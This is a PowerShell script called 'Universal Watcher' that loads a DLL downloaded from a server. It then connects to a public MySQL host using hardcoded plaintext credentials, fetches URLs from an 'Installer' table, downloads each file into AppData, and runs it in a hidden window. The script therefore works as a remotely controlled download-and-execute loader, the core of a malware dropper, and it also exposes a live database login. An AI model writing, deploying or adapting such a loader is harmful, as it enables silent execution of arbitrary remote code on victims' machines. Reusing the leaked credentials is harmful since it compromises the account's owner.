# ===============================
# UNIVERSAL WATCHER PS1 SCRIPT
# ===============================

Add-Type -AssemblyName PresentationFramework

# Paths
$AppDataPath = [Environment]::GetFolderPath("ApplicationData")
$DependencyPath = Join-Path -Path $AppDataPath -ChildPath "MySql.Data.dll"

# URL to download MySql.Data.dll if missing
$DependencyUrl = "https://yourserver.com/deps/MySql.Data.dll"

# Connection details
$ConnectionString = "server=sql7.freesqldatabase.com;port=3306;uid=sql7788502;pwd=Y3jJUaTBR4;database=sql7788502"

# -------------------------------
# 1. Dependency Check & Download
# -------------------------------
if (-Not (Test-Path $DependencyPath)) {
    [System.Windows.MessageBox]::Show("Dependency missing. Downloading MySql.Data.dll...", "Dynamic Watcher")

    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($DependencyUrl, $DependencyPath)
        [System.Windows.MessageBox]::Show("Downloaded MySql.Data.dll successfully.", "Dynamic Watcher")
    }
    catch {
        [System.Windows.MessageBox]::Show("Failed to download dependency: $_", "Dynamic Watcher")
        exit 1
    }
} else {
    # Dependency already present
    Write-Host "Dependency exists: $DependencyPath"
}

# -------------------------------
# 2. Load Dependency
# -------------------------------
try {
    Add-Type -Path $DependencyPath
}
catch {
    [System.Windows.MessageBox]::Show("ERROR loading MySql.Data.dll: $_", "Dynamic Watcher")
    exit 1
}

# -------------------------------
# 3. Connect to Database
# -------------------------------
try {
    $Connection = New-Object MySql.Data.MySqlClient.MySqlConnection $ConnectionString
    $Connection.Open()
    [System.Windows.MessageBox]::Show("Connected to database successfully.", "Dynamic Watcher")
}
catch {
    [System.Windows.MessageBox]::Show("Database connection failed: $_", "Dynamic Watcher")
    exit 1
}

# -------------------------------
# 4. Query Installer table
# -------------------------------
$Query = "SELECT Id, GuID, URL FROM Installer WHERE IsActive=1"
$Command = $Connection.CreateCommand()
$Command.CommandText = $Query

try {
    $Reader = $Command.ExecuteReader()

    while ($Reader.Read()) {
        $Guid = $Reader["GuID"]
        $Url = $Reader["URL"]

        $TargetFile = Join-Path -Path $AppDataPath -ChildPath $Guid

        # Download file
        [System.Windows.MessageBox]::Show("Downloading: $Url", "Dynamic Watcher")
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($Url, $TargetFile)

        # Execute file
        Start-Process -FilePath $TargetFile -WindowStyle Hidden

        [System.Windows.MessageBox]::Show("Downloaded and executed: $Guid", "Dynamic Watcher")
    }

    $Reader.Close()
}
catch {
    [System.Windows.MessageBox]::Show("ERROR during DB operation: $_", "Dynamic Watcher")
}
finally {
    $Connection.Close()
}
